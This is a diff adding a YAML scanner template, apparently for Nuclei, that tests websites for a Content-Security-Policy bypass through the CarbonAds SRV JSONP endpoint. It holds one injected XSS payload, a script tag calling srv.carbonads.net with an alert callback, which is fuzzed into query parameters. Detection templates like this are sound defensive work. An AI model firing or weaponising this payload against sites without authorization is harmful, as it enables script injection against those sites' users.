@@ -1,0 +1,55 @@
+id: carbonads-srv-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - CarbonAds SRV
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,carbonads-srv,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "carbonads.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: carbonads_srv_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "carbonads_srv_csp_xss == true"
+# digest: 4a0a004730450220363383ebf8c5980e6ed83ff0c3bf84197ed95b798fefa412cb12fb858f247894022100b8bd01b6cbaafdd1f192acc0a202b789f3f2b020ebcf94d9f4ceb4eab8f9dce6:922c64590222798bb761d5b6d8e72950
